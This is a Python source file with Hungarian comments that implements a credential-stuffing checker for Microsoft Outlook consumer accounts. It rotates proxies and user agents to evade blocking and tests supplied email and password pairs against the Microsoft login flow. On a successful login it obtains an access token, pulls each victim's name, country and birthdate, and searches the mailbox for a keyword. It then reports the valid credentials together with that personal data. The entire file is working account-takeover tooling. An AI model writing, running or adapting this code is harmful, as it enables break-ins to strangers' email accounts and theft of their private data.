import requests
import uuid
import json
import re
import time
import random
from proxy_manager import proxy_manager

# Fix User-Agentek a blokkolások elkerülése érdekében
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
]

# Max próbálkozás proxy hibák esetén (sebesség miatt 3-ra állítva)
PROXY_RETRIES = 3 

def generate_user_agent():
    return random.choice(USER_AGENTS)

def checker_worker_single(email: str, password: str, keyword: str):
    """
    Fő vezérlő függvény egyetlen fiók ellenőrzéséhez.
    Retry logikát alkalmaz proxy hiba esetén.
    """
    for attempt in range(PROXY_RETRIES):
        proxy_dict = proxy_manager.get_proxy()
        session = requests.Session()
        if proxy_dict:
            session.proxies = proxy_dict

        try:
            result = _do_check(session, email, password, keyword)

            # Ha végleges eredményt kaptunk (Jó, Rossz, vagy Egyedi), azonnal visszaadjuk
            if result["status"] in ("hit", "custom", "bad"):
                return result
            
            # Ha "error", akkor a proxy nem működött megfelelően, jöhet a következő próbálkozás
        except Exception:
            pass
        finally:
            session.close()

        # Rövid várakozás a próbálkozások között az ütközések elkerülésére
        time.sleep(0.01)

    return {"status": "error", "reason": "All proxy attempts failed"}

def _do_check(session, email, password, keyword):
    """
    A tényleges bejelentkezési és keresési folyamat.
    """
    try:
        user_agent = generate_user_agent()
        
        # --- 1. LÉPÉS: Bejelentkező oldal lekérése és tokenek kinyerése ---
        url = (
            "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?"
            f"client_info=1&haschrome=1&login_hint={email}"
            "&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
            "&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            "&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
        )

        headers = {
            "User-Agent": user_agent,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1"
        }

        response = session.get(url, headers=headers, timeout=12)
        response_text = response.text

        # Ellenőrizzük, hogy valódi Microsoft oldalt kaptunk-e
        if "PPFT" not in response_text or "urlPost" not in response_text:
            return {"status": "error", "reason": "Invalid response from proxy"}

        # PPFT kinyerése regex-el (gyorsabb mint a string find)
        ppft_match = re.search(r'name="PPFT" id="i0327" value="(.+?)"', response_text)
        url_post_match = re.search(r"urlPost:'(.+?)'", response_text)
        
        if not ppft_match or not url_post_match:
            return {"status": "error", "reason": "Token extraction failed"}

        ppft = ppft_match.group(1)
        url_post = url_post_match.group(1)

        # --- 2. LÉPÉS: Hitelesítési adatok küldése (POST) ---
        # Cookie-k előkészítése a fejlécben a biztonság kedvéért
        cookies = session.cookies.get_dict()
        
        post_data = {
            "login": email,
            "passwd": password,
            "PPFT": ppft,
            "ps": "2",
            "PPSX": "Passport",
            "NewUser": "1",
            "i19": "3412"
        }

        headers_post = {
            "User-Agent": user_agent,
            "Content-Type": "application/x-www-form-urlencoded",
            "Referer": response.url,
            "Origin": "https://login.live.com",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
        }

        post_response = session.post(url_post, data=post_data, headers=headers_post, allow_redirects=False, timeout=12)
        
        # --- 3. LÉPÉS: Eredmény ellenőrzése ---
        # Ha nincs auth cookie, akkor sikertelen a belépés
        if "__Host-MSAAUTHP" not in session.cookies:
            if "incorrect" in post_response.text.lower() or "sErrTxt" in post_response.text:
                return {"status": "bad"} # Helytelen jelszó
            return {"status": "error", "reason": "Login flow interrupted"}

        # Sikeres belépés! Token és adatok lekérése következik.
        
        # Redirect URL-ből az auth code kinyerése
        auth_code = ""
        location = post_response.headers.get("Location", "")
        if "code=" in location:
            auth_code = location.split("code=")[1].split("&")[0]
        
        cid = session.cookies.get("MSPCID", "").upper()

        # --- 4. LÉPÉS: Access Token igénylése ---
        access_token = ""
        if auth_code:
            token_url = "https://login.microsoftonline.com/consumers/oauth2/v2.0/token"
            token_data = {
                "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
                "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
                "grant_type": "authorization_code",
                "code": auth_code,
                "scope": "profile openid offline_access https://outlook.office.com/M365.Access"
            }
            token_res = requests.post(token_url, data=token_data, timeout=10)
            if token_res.status_code == 200:
                access_token = token_res.json().get("access_token", "")

        if not access_token:
            # Ha bejutottunk, de nincs token, CUSTOM-ként mentjük el
            return {"status": "custom", "data": {"email": email, "password": password, "country": "N/A", "name": "N/A"}}

        # --- 5. LÉPÉS: Profil adatok lekérése ---
        name = "N/A"
        country = "N/A"
        birthdate = "N/A"
        
        profile_url = "https://substrate.office.com/profileb2/v2.0/me/V1Profile"
        profile_headers = {
            "Authorization": f"Bearer {access_token}",
            "X-AnchorMailbox": f"CID:{cid}",
            "User-Agent": "Outlook-Android/2.0"
        }

        try:
            p_res = requests.get(profile_url, headers=profile_headers, timeout=10)
            if p_res.status_code == 200:
                p_data = p_res.json()
                if "names" in p_data and p_data["names"]:
                    name = p_data["names"][0].get("displayName", "N/A")
                if "accounts" in p_data and p_data["accounts"]:
                    acc = p_data["accounts"][0]
                    country = acc.get("location", "N/A")
                    by = acc.get("birthYear", "")
                    bm = acc.get("birthMonth", "")
                    bd = acc.get("birthDay", "")
                    if by: birthdate = f"{by}-{str(bm).zfill(2)}-{str(bd).zfill(2)}"
        except: pass

        # --- 6. LÉPÉS: Email keresés (Keyword alapján) ---
        total_mails = "0"
        last_date = "N/A"

        search_url = "https://outlook.live.com/search/api/v2/query"
        search_payload = {
            "Scenario": {"Name": "owa.react"},
            "EntityRequests": [{
                "EntityType": "Conversation",
                "Query": {"QueryString": keyword},
                "Size": 5
            }]
        }
        search_headers = {
            "Authorization": f"Bearer {access_token}",
            "Content-Type": "application/json",
            "X-AnchorMailbox": f"CID:{cid}",
            "User-Agent": "Outlook-Android/2.0"
        }

        try:
            s_res = requests.post(search_url, json=search_payload, headers=search_headers, timeout=10)
            if s_res.status_code == 200:
                s_data = s_res.json()
                # Találatok számának kinyerése
                if "Value" in s_data and s_data["Value"]:
                    results = s_data["Value"][0]
                    total_mails = str(results.get("Total", "0"))
                    if results.get("Items"):
                        last_date = results["Items"][0].get("LastModifiedTime", "N/A")
        except: pass

        # --- VÉGEREDMÉNY ÖSSZEÁLLÍTÁSA ---
        if total_mails != "0" and total_mails != "":
            return {
                "status": "hit",
                "data": {
                    "email": email,
                    "password": password,
                    "country": country,
                    "name": name,
                    "birthdate": birthdate,
                    "date": last_date,
                    "mails": total_mails
                }
            }
        
        return {
            "status": "custom",
            "data": {
                "email": email,
                "password": password,
                "country": country,
                "name": name,
                "birthdate": birthdate
            }
        }

    except Exception as e:
        return {"status": "error", "reason": str(e)}
